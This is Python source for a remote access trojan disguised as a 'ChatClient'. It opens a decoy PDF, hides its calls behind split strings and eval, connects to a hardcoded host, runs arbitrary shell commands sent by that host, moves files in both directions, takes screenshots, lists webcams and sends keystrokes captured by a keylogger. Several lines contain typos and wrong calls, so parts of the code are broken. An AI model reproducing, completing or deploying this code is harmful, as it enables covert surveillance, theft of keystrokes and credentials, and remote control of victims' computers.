from fileinput import filename
import socket
import os
import sys
import subprocess
import simplejson as json
import base64
import time
import threading
import pynput.keyboard as keyboard
import numpy as np
import cv2
import pyscreeze
import datetime

class ChatClient:
    def __init__(self,host,port):
        self.host = host
        self.port = port
        self.is_running = True
        self.time_out = 0
        self.time_out_cap = 1800
        time.sleep(1)
        self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    def connect(self):
        self.open_data()
        y = 'self.my_so'+'cket.conn'+'ect((self.ho'+'st,self.p'+'ort))'
        time.sleep(2)
        self.connected = False
        count = 1
        while not self.connected:
            try:
                eval(y)
                time.sleep(3*count)
                count += 1
                if count > 100:
                    count = 1
                self.connected = True
                self.is_running = True
                self.time_out = 0
                restart_thread = threading.Thread(target=self.restart_connection)
                restart_thread.start()
                self.start_chat()
            except Exception:
                pass
    
    def restart_connection(self):
        while self.time_out < self.time_out_cap and self.is_running and self.connected:
            time.sleep(1)
            self.time_out += 1
            if self.time_out >= self.time_out_cap:
                try:
                    self.send_json("Connection Aborted.", self.my_socket)
                    self.my_socket.shutdown(socket.SHUT_RDWR)
                    self.is_running = False
                    time.sleep(3)
                    self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREEM)
                    self.connect()
                except Exception:
                    pass

    def start_chat(self):
        while self.is_running == True:
            try:
                message = self.receive_json(self.my_socket)
                self.time_out = 0
                if message == "Conn"+"ection Esta"+"blished: ":
                    pass#print(message)
                elif message == "exit":
                    self.is_running = False
                    self.my_socket.shutdown(socket.SHUT_RDWR)
                elif message == "hold":
                    self.my_socket.shutdown(socket.SHUT_RDWR)
                    time.sleep(5)
                    self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREEM)
                    self.connect()
                elif message[0] == "start_key_log":
                    self.start_key_log()
                    self.send_json("keylogger Started", self.my_socket)
                elif message[0] == "dump_key_log":
                    self.dump_key_log()
                elif message[0] == "dump_key_log_raw":
                    self.dump_key_log_raw()
                elif message == "stop_key_log":
                    self.logging = False
                    self.send_json("Keylogger Stopped:", self.my_socket)
                elif message[0] == "cd" and len(message) > 1:
                    x = 'o'+'s.chd'+'ir(message[1])'
                    eval(x)
                    self.send_json("Directory Changed to " + str(message[1]), self.my_socket)
                elif message[0] == "set_time_out" and len(message) > 1 and message[1].isnumeric():
                    self.set_time_out.cap(message[1])
                    self.send_json("Timeout cap set to" + str(message[1]) + "s", self.my_socket)
                elif (message[0] == "dow"+"nload" or message[0] == "get" ) and len(message) > 1:
                    self.send_file(message[1])
                elif (message[0] == "upl"+"oad" or message[0] == "put") and len(message) > 1:
                    self.receive_file(message[1],message[2])
                elif (message[0] == "screen"+"shot" ):
                    self.screenshot()
                elif (message[0] == "webc"+"am_list" ):
                    webcams = self.get_webcam_list()
                    self.send_json(str(webcams), self.my_socket)
                else:
                    x = 'subp'+'rocess.che'+'ck'+'_output(message, sh'+'ell = True, stde'+'rr=subpr'+'ocess.DEVN'+'ULL, st'+'din=subpro'+'cess.DEVN'+'ULL)'
                    output = eval(x)
                    self.send_json(output, self.my_socket)
            except Exception as e:
                self.send_json("could not process", self.my_socket)
    def screenshot(self):
        image = pyscreeze.screenshot()
        image = cv2.cvtColor(no.array(image), cv2.COLOR_RGB28GR)
        filename = self.getfilename() + ".png"
        if cv2.imwrite(filename, image):
            self.send_file( filename )
            self.remove_file( flename )
    
    def get_webcam_list(self):
        index = 0
        connected_webams = []
        while True:
            try:
                cap = cv2.VideoCapture(index)
                if not cap.isOpened():
                    break
                camera_name = cap.get(cv2.CAP_PROP_POS_MSEC)
                if not camera_name:
                    camera_name = f"Camera {index}"
                cap.release()
                connected_webams.append(str(index) + '. ' + str(camera_name))
            except Exception as e:
                print(e)
                pass
            index +=1
            print(connected_webams)
            return connected_webams

    def remove_files(self, file_path):
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            pass
    
    def getfilename(self):
        x = datetime.datetime.now()
        return x.strftime("%d_%m_%y")
    
    def receive_file(self, path, data):
        try:
            with open(path, "wb") as my_file:
                my_file.write(base64.b64decode(data))
            self.send_json("Sucess: File "+ str(path) + " received ", self.my_socket)
        except Exception:
            self.send_json("Error : File" + str(path) + " not uploaded ", self.my_socket)
    
    def send_file(self, path):
        try:
            with open(path, "rb") as my_file:
                file_data = my_file.read()
                self.send_json(base64.b64decode(file_data), self.my_socket)
        except FileNotFoundError:
            self.send_json("Error: File "+ str(path) + "not found", self.my_socket)
    
    def set_time_out_cap(self, time_out_cap):
        self.time_out_cap = int(time_out_cap)
    
    def receive_json(self, client):
        output = ""
        while True:
            try:
                output += client.recv(1024).decode("utf-8")
                return json.loads(output)
            except ValueError:
                continue
            except TypeError:
                continue
            except (KeyboardInterrupt, ConnectionAbortedError):
                self.send_json("connection Aborted.",self.my_socket)
                self.is_running = False
                self.my_socket.close()
                break
    
    def send_json(self, data, client):
        data = json.dumps(data)
        client.send(data.encode("utf-8"))
    
    def open_data(self):
        data = sys._MEIPASS + "\\demo_how_hack_without_exe.pdf"
        x = 'subp'+'rocess.P'+'ope'+'n(data, she'+'ll=True)'
        eval(x)
    
    def dump_key_log(self):
        try:
            self.send_json((self.char), self.my_socket)
        except Exception:
            self.send_json("could not Dump key log.", self.my_socket)
    
    def dump_key_log_raw(self):
        try:
            self.send_json((self.log), self.my_socket)
        except Exception:
            self.send_json("could not dump key log raw", self.my_socket)
    
    def start_key_log(self):
        self.log = ""
        self.char = ""
        self.logging = True
        log_thread = threading.Thread(target=self.save_log)
        log_thread.start()
    
    def save_log(self):
        with keyboard.Listener( on_press = self.key_pressed ) as listener:
            listener.join()
    
    def key_pressed(self, key):
        if not self.logging:
            return False
        try:
            if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                x = int(key.vk) - 96
                log += str(x)
                char += str(x)
            else:
                log += str(key.char)
                char += str(key.char)
        except AttributeError:
            self.log += " " + str(key) + " "
            if key == keyboard.Key.space:
                self.char += " "
            elif key == keyboard.Key.backspace:
                self.char = self.char[0:-1]
            elif key == keyboard.Key.enter:
                self.char += "\n"
            elif key == keyboard.Key.tab:
                self.char +="\t"
            elif key == keyboard.Key.ctrl:
                self.char += " ctrl + "

if __name__ == "__main__":
    client = ChatClient('19'+'2.1'+'68.12'+'.186', 5656)
    client.connect()
